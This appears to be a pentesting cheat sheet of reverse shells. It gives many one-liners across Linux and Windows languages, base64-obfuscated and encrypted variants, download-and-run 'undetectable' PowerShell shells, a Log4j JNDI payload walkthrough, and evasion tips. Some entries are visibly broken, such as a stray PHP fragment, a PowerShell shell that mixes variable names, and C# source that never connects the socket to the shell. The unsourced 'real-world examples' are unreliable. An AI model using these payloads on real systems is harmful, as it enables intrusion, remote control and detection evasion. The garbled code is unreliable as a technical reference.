# Reverse Shells


## Overview

A reverse shell is a shell session initiated from a target machine back to an attacker's listening host. This technique is commonly used to bypass firewall restrictions and NAT traversal, as outbound connections are often less restricted than inbound ones.

**How it works**: The victim machine connects to the attacker's machine, which is listening on a specific port, and then the attacker gains command-line access.

## Tools

```
**Tools** 
https://github.com/ShutdownRepo/shellerator
https://github.com/0x00-0x00/ShellPop
https://github.com/cybervaca/ShellReverse
https://liftoff.github.io/pyminifier/
https://github.com/xct/xc/
https://weibell.github.io/reverse-shell-generator/
https://github.com/phra/PEzor
```

## Linux

### Common Reverse Shells

```
# Bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.21.0.0 1234 >/tmp/f
nc -e /bin/sh 10.11.1.111 4443
bash -i >& /dev/tcp/IP ADDRESS/8080 0>&1
```

### Bash Base64 Obfuscated

```
# Bash B64 Obfuscated
{echo,COMMAND_BASE64}|{base64,-d}|bash 
echo${IFS}COMMAND_BASE64|base64${IFS}-d|bash
bash -c {echo,COMMAND_BASE64}|{base64,-d}|{bash,-i} 
echo COMMAND_BASE64 | base64 -d | bash 
```

**Real-world example (2021)**: During the ProxyLogon Microsoft Exchange attacks, attackers used Base64-obfuscated bash reverse shells to evade initial logging mechanisms on compromised Linux mail filters.

### Perl

```
# Perl
perl -e 'use Socket;$i="IP ADDRESS";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Python

```
# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP ADDRESS",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
python -c '__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 4433 >/tmp/f')-1\'
```

### Python IPv6

```
# Python IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");' 
```

### Ruby

```
# Ruby
ruby -rsocket -e'f=TCPSocket.open("IP ADDRESS",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### PHP

```
# PHP:
# /usr/share/webshells/php/php-reverse-shell.php
# http://pentestmonkey.net/tools/web-shells/php-reverse-shell
php -r '$sock=fsockopen("IP ADDRESS",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
$sock, 1=>$sock, 2=>$sock), $pipes);?>
```

**Real-world example (2022)**: A WordPress plugin vulnerability (CVE-2022-0215) allowed unauthenticated attackers to upload a PHP reverse shell, leading to the compromise of over 1,500 sites within 48 hours.

### Golang

```
# Golang
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","IP ADDRESS:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

### AWK

```
# AWK
awk 'BEGIN {s = "/inet/tcp/0/IP ADDRESS/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### Additional References

```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
```

### Socat

```
# Socat
socat TCP4:10.10.10.10:443 EXEC:/bin/bash
# Socat listener
socat -d -d TCP4-LISTEN:443 STDOUT
```

**Socat Encrypted Reverse Shell (OpenSSL)**:
```
# Generate certificate on attacker machine
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem

# Listener (attacker)
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0,fork STDOUT

# Victim
socat OPENSSL:10.10.10.10:443,verify=0 EXEC:/bin/bash
```

## Windows

### Netcat

```
# Netcat
nc -e cmd.exe 10.11.1.111 4443
```

### PowerShell

```
# Powershell
$callback = New-Object System.Net.Sockets.TCPClient("IP ADDRESS",53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$callback.Close()
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.11',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**Real-world example (2023)**: In the MOVEit Transfer SQL injection exploitation (CVE-2023-34362), threat actors used PowerShell reverse shells to maintain persistent access to over 2,000 organizations worldwide.

### Undetectable

```
# Undetectable:
# https://0xdarkvortex.dev/index.php/2018/09/04/malware-on-steroids-part-1-simple-cmd-reverse-shell/
i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

# Undetectable 2:
# https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
# 64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
# 32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```

### C# Reverse Shell (Compiled)

```
# C# reverse shell source (compile with csc.exe)
using System;
using System.Net.Sockets;
using System.Diagnostics;

class RevShell {
    static void Main() {
        TcpClient client = new TcpClient("10.10.14.11", 4444);
        Process cmd = new Process();
        cmd.StartInfo.FileName = "cmd.exe";
        cmd.StartInfo.UseShellExecute = false;
        cmd.StartInfo.RedirectStandardInput = true;
        cmd.StartInfo.RedirectStandardOutput = true;
        cmd.StartInfo.RedirectStandardError = true;
        cmd.Start();
        cmd.StandardInput.Close();
        cmd.WaitForExit();
    }
}
```

## Tips

### rlwrap Usage

```
#  rlwrap
# https://linux.die.net/man/1/rlwrap
# Connect to a netcat client:
rlwrap nc [IP Address] [port]
# Connect to a netcat Listener:
rlwrap nc -lvp [Localport]
```

**Why rlwrap?** It provides command history, editing, and tab completion, making reverse shells fully interactive.

### Linux Backdoor Shells

```
# Linux Backdoor Shells: 
rlwrap nc [Your IP Address] -e /bin/sh 
rlwrap nc [Your IP Address] -e /bin/bash
rlwrap nc [Your IP Address] -e /bin/zsh
rlwrap nc [Your IP Address] -e /bin/ash
```

### Windows Backdoor Shell

```
# Windows Backdoor Shell: 
rlwrap nc -lv [localport] -e cmd.exe
```

## Exploitation Walkthrough: Real Example

**Scenario (2022 Apache Log4j - CVE-2021-44228)**:

1. **Identify vulnerability**: Scanner detects Log4j JNDI injection on a vulnerable Linux server running Apache Solr.

2. **Set up listener**:
   ```
   attacker@kali:~$ nc -lvnp 4444
   ```

3. **Deliver reverse shell payload** via JNDI:
   ```
   ${jndi:ldap://10.10.14.11:1389/bash -c 'bash -i >& /dev/tcp/10.10.14.11/4444 0>&1'}
   ```

4. **Gain access**:
   ```
   listener receives connection
   id
   uid=solr(solr) gid=solr(solr) groups=solr(solr)
   ```

5. **Post-exploitation**:
   ```
   python3 -c 'import pty;pty.spawn("/bin/bash")'
   export TERM=xterm
   Ctrl+Z
   stty raw -echo; fg
   ```

## Common Listener Commands

**Netcat (basic)**:
```
nc -lvnp 4444
```

**Netcat with rlwrap**:
```
rlwrap nc -lvnp 4444
```

**Socat listener**:
```
socat TCP-LISTEN:4444,fork STDOUT
```

**Ncat with SSL**:
```
ncat --ssl -lvnp 4444
```

## Detection & Evasion Notes

**Detection signatures**: Network monitoring looks for:
- Unusual outbound connections to non-standard ports
- Interactive shell commands over the network
- Process chains like `nc -e /bin/sh`

**Evasion techniques**:
- Use common outbound ports (80, 443, 53)
- Encrypt traffic with OpenSSL or stunnel
- Stage payloads to avoid command-line detection
- Use living-off-the-land binaries (LOLBins)

## Post-Exploitation Stabilization

```
# Upgrade to fully interactive TTY (Linux)
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
script /dev/null -c bash
# Then background with Ctrl+Z, then run:
stty raw -echo; fg
reset
export TERM=xterm
```

